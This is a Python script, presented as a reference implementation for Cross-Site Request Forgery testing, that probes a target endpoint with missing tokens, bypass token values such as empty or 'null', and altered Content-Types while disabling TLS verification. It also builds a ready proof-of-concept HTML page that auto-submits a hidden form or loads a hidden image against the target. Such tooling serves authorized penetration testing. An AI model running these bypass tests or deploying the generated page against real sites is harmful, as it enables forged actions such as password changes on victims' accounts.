#!/usr/bin/env python3
"""
Reference example: CSRF Vulnerability Testing

This file is a reference implementation illustrating how to test for
Cross-Site Request Forgery (CSRF) vulnerabilities by testing token
validation and bypass techniques.

Usage:
    python csrf_testing.py --url "http://target.com/api/password/change" \\
        --method POST --data '{"password":"test"}' --cookie "session=abc" --output results.json
"""
import argparse
import json
import hashlib
import requests
from typing import Dict, List, Any, Optional
from urllib.parse import urlparse, urlencode
import re

# Disable SSL warnings for testing
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Response size limit
MAX_RESPONSE_SIZE = 8 * 1024

# Common CSRF token parameter names
CSRF_TOKEN_NAMES = [
    "csrf_token",
    "csrftoken",
    "csrf",
    "_csrf",
    "_token",
    "token",
    "authenticity_token",
    "__RequestVerificationToken",
    "csrfmiddlewaretoken",
    "XSRF-TOKEN",
    "_csrfToken",
    "X-CSRF-Token",
]

# Common CSRF header names
CSRF_HEADER_NAMES = [
    "X-CSRF-Token",
    "X-XSRF-Token",
    "X-CSRFToken",
    "X-Requested-With",
]

# Token bypass values
TOKEN_BYPASS_VALUES = [
    "",           # Empty string
    "null",       # String null
    "undefined",  # String undefined
    "0",          # Zero
    "false",      # String false
    "true",       # String true
    "a",          # Single character
    "test",       # Simple string
]


def truncate_and_hash(response_text: str) -> tuple:
    """Truncate response and compute hash"""
    full_hash = hashlib.sha256(response_text.encode()).hexdigest()
    truncated = response_text[:MAX_RESPONSE_SIZE]
    is_truncated = len(response_text) > MAX_RESPONSE_SIZE

    return truncated, f"sha256:{full_hash}", is_truncated, len(response_text)


def find_csrf_token_in_response(response_text: str) -> Optional[Dict[str, str]]:
    """Attempt to find CSRF token in HTML response"""
    # Search for hidden input fields with CSRF-like names
    for name in CSRF_TOKEN_NAMES:
        # Pattern for <input type="hidden" name="csrf_token" value="xxx">
        pattern = rf'<input[^>]*name=["\']?{re.escape(name)}["\']?[^>]*value=["\']?([^"\'>\s]+)["\']?'
        match = re.search(pattern, response_text, re.IGNORECASE)
        if match:
            return {"name": name, "value": match.group(1), "location": "form_field"}

        # Pattern for value before name
        pattern = rf'<input[^>]*value=["\']?([^"\'>\s]+)["\']?[^>]*name=["\']?{re.escape(name)}["\']?'
        match = re.search(pattern, response_text, re.IGNORECASE)
        if match:
            return {"name": name, "value": match.group(1), "location": "form_field"}

    # Search in meta tags
    for name in CSRF_TOKEN_NAMES:
        pattern = rf'<meta[^>]*name=["\']?{re.escape(name)}["\']?[^>]*content=["\']?([^"\'>\s]+)["\']?'
        match = re.search(pattern, response_text, re.IGNORECASE)
        if match:
            return {"name": name, "value": match.group(1), "location": "meta_tag"}

    return None


def test_no_token(
    url: str,
    method: str,
    data: Optional[str],
    session: requests.Session,
    content_type: str = "application/json",
    timeout: int = 10
) -> Dict[str, Any]:
    """Test request without any CSRF token"""
    headers = {"Content-Type": content_type}

    try:
        if method.upper() == "GET":
            resp = session.get(url, timeout=timeout, verify=False)
        else:
            if content_type == "application/json":
                resp = session.request(method, url, data=data, headers=headers,
                                      timeout=timeout, verify=False)
            else:
                # Form data
                resp = session.request(method, url, data=data, headers=headers,
                                      timeout=timeout, verify=False)

        snippet, resp_hash, truncated, orig_size = truncate_and_hash(resp.text)

        return {
            "test_type": "no_token",
            "url": url,
            "method": method,
            "status_code": resp.status_code,
            "response_snippet": snippet[:500],
            "response_hash": resp_hash,
            "truncated": truncated,
            "original_size_bytes": orig_size,
            "success": resp.status_code in [200, 201, 204, 302]
        }

    except requests.RequestException as e:
        return {
            "test_type": "no_token",
            "url": url,
            "method": method,
            "error": str(e),
            "success": False
        }


def test_invalid_token(
    url: str,
    method: str,
    data: Optional[str],
    token_name: str,
    token_value: str,
    session: requests.Session,
    content_type: str = "application/json",
    timeout: int = 10
) -> Dict[str, Any]:
    """Test request with invalid CSRF token value"""
    headers = {"Content-Type": content_type}

    try:
        # Add token to data or headers
        if content_type == "application/json" and data:
            try:
                json_data = json.loads(data)
                json_data[token_name] = token_value
                data = json.dumps(json_data)
            except json.JSONDecodeError:
                pass
        elif content_type == "application/x-www-form-urlencoded" and data:
            data = f"{data}&{token_name}={token_value}"

        # Also try as header
        for header_name in CSRF_HEADER_NAMES:
            if token_name.lower() in header_name.lower():
                headers[header_name] = token_value
                break

        resp = session.request(method, url, data=data, headers=headers,
                              timeout=timeout, verify=False)

        snippet, resp_hash, truncated, orig_size = truncate_and_hash(resp.text)

        return {
            "test_type": "invalid_token",
            "token_name": token_name,
            "token_value": token_value,
            "url": url,
            "method": method,
            "status_code": resp.status_code,
            "response_snippet": snippet[:500],
            "response_hash": resp_hash,
            "truncated": truncated,
            "original_size_bytes": orig_size,
            "success": resp.status_code in [200, 201, 204, 302]
        }

    except requests.RequestException as e:
        return {
            "test_type": "invalid_token",
            "token_name": token_name,
            "token_value": token_value,
            "url": url,
            "method": method,
            "error": str(e),
            "success": False
        }


def test_content_type_bypass(
    url: str,
    method: str,
    data: Optional[str],
    session: requests.Session,
    timeout: int = 10
) -> List[Dict[str, Any]]:
    """Test CSRF bypass via Content-Type manipulation"""
    results = []

    # Content-Types that might bypass CSRF checks
    content_types = [
        "text/plain",
        "application/x-www-form-urlencoded",
        "multipart/form-data",
        "application/xml",
        "text/xml",
    ]

    for ct in content_types:
        try:
            headers = {"Content-Type": ct}

            # Convert JSON data to form data if needed
            test_data = data
            if ct == "application/x-www-form-urlencoded" and data:
                try:
                    json_data = json.loads(data)
                    test_data = urlencode(json_data)
                except json.JSONDecodeError:
                    pass

            resp = session.request(method, url, data=test_data, headers=headers,
                                  timeout=timeout, verify=False)

            snippet, resp_hash, truncated, orig_size = truncate_and_hash(resp.text)

            results.append({
                "test_type": "content_type_bypass",
                "content_type": ct,
                "url": url,
                "method": method,
                "status_code": resp.status_code,
                "response_snippet": snippet[:300],
                "response_hash": resp_hash,
                "truncated": truncated,
                "original_size_bytes": orig_size,
                "success": resp.status_code in [200, 201, 204, 302]
            })

        except requests.RequestException as e:
            results.append({
                "test_type": "content_type_bypass",
                "content_type": ct,
                "url": url,
                "method": method,
                "error": str(e),
                "success": False
            })

    return results


def test_csrf(
    url: str,
    method: str = "POST",
    data: Optional[str] = None,
    cookie: Optional[str] = None,
    header: Optional[str] = None,
    timeout: int = 10
) -> Dict[str, Any]:
    """
    Main CSRF testing function

    Args:
        url: Target URL for state-changing action
        method: HTTP method (POST, PUT, DELETE, etc.)
        data: Request body data (JSON string)
        cookie: Session cookie
        header: Custom header
        timeout: Request timeout

    Returns:
        Dictionary with all CSRF test results
    """
    session = requests.Session()

    # Set cookies if provided
    if cookie:
        for c in cookie.split(";"):
            c = c.strip()
            if "=" in c:
                name, value = c.split("=", 1)
                session.cookies.set(name.strip(), value.strip())

    # Set custom headers if provided
    if header:
        if ":" in header:
            name, value = header.split(":", 1)
            session.headers[name.strip()] = value.strip()

    # Get page to find CSRF token (if form-based)
    csrf_token = None
    try:
        get_resp = session.get(url, timeout=timeout, verify=False)
        csrf_token = find_csrf_token_in_response(get_resp.text)
    except requests.RequestException:
        pass

    tests = []

    # Test 1: No token
    no_token_result = test_no_token(url, method, data, session, timeout=timeout)
    tests.append(no_token_result)

    # Test 2: Invalid token values
    for token_name in CSRF_TOKEN_NAMES[:3]:  # Test first 3 common names
        for bypass_value in TOKEN_BYPASS_VALUES:
            result = test_invalid_token(url, method, data, token_name, bypass_value,
                                       session, timeout=timeout)
            tests.append(result)

    # Test 3: Content-Type bypass
    ct_results = test_content_type_bypass(url, method, data, session, timeout=timeout)
    tests.extend(ct_results)

    # Find successful bypasses
    successful = [t for t in tests if t.get("success")]

    # Determine status
    if successful:
        status = "VALIDATED"
        # Check if no_token succeeded (worst case)
        no_token_success = any(t.get("test_type") == "no_token" and t.get("success") for t in tests)
        if no_token_success:
            evidence = f"CSRF vulnerability: Action performed without any CSRF token"
        else:
            evidence = f"CSRF bypass found via {successful[0].get('test_type')}"
    else:
        status = "FALSE_POSITIVE"
        evidence = "CSRF protection working correctly - all bypass attempts failed"

    return {
        "status": status,
        "csrf_token_found": csrf_token,
        "tests": tests,
        "successful_bypasses": successful,
        "evidence": evidence
    }


def generate_csrf_poc(url: str, method: str, data: Optional[str] = None) -> str:
    """Generate CSRF PoC HTML"""
    if method.upper() == "GET":
        poc = f'''<!DOCTYPE html>
<html>
<head><title>CSRF PoC - GET</title></head>
<body>
    <h1>CSRF PoC</h1>
    <img src="{url}" style="display:none">
    <p>Request sent!</p>
</body>
</html>'''
    else:
        # POST/PUT/DELETE via form
        inputs = ""
        if data:
            try:
                json_data = json.loads(data)
                for key, value in json_data.items():
                    inputs += f'    <input type="hidden" name="{key}" value="{value}">\n'
            except json.JSONDecodeError:
                inputs = f'    <input type="hidden" name="data" value="{data}">\n'

        poc = f'''<!DOCTYPE html>
<html>
<head><title>CSRF PoC - {method}</title></head>
<body>
    <h1>CSRF PoC</h1>
    <form id="csrf-form" action="{url}" method="POST">
{inputs}    </form>
    <script>
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>'''

    return poc


def main():
    parser = argparse.ArgumentParser(description="CSRF Vulnerability Testing Script")
    parser.add_argument("--url", required=True, help="Target URL for state-changing action")
    parser.add_argument("--method", default="POST", help="HTTP method (default: POST)")
    parser.add_argument("--data", "-d", help="Request body data (JSON)")
    parser.add_argument("--cookie", help="Session cookie (name=value; name2=value2)")
    parser.add_argument("--header", "-H", help="Custom header (Header-Name: value)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout (seconds)")
    parser.add_argument("--output", "-o", required=True, help="Output JSON file")
    parser.add_argument("--poc", action="store_true", help="Generate PoC HTML")

    args = parser.parse_args()

    print(f"[*] Testing CSRF on: {args.url}")
    print(f"[*] Method: {args.method}")

    result = test_csrf(
        url=args.url,
        method=args.method,
        data=args.data,
        cookie=args.cookie,
        header=args.header,
        timeout=args.timeout
    )

    # Generate PoC if requested
    if args.poc and result.get("successful_bypasses"):
        result["poc"] = generate_csrf_poc(args.url, args.method, args.data)

    with open(args.output, 'w') as f:
        json.dump(result, f, indent=2)

    print(f"[*] Status: {result['status']}")
    print(f"[*] Evidence: {result.get('evidence', 'N/A')}")

    if result.get('csrf_token_found'):
        print(f"[*] Found CSRF token: {result['csrf_token_found'].get('name')}")

    if result.get('successful_bypasses'):
        print(f"[!] Found {len(result['successful_bypasses'])} CSRF bypass(es):")
        for bypass in result['successful_bypasses'][:5]:  # Show first 5
            print(f"    - {bypass.get('test_type')}: {bypass.get('status_code')}")

    print(f"[*] Results saved to: {args.output}")

    return 0 if result['status'] != 'UNVALIDATED' else 1


if __name__ == "__main__":
    exit(main())
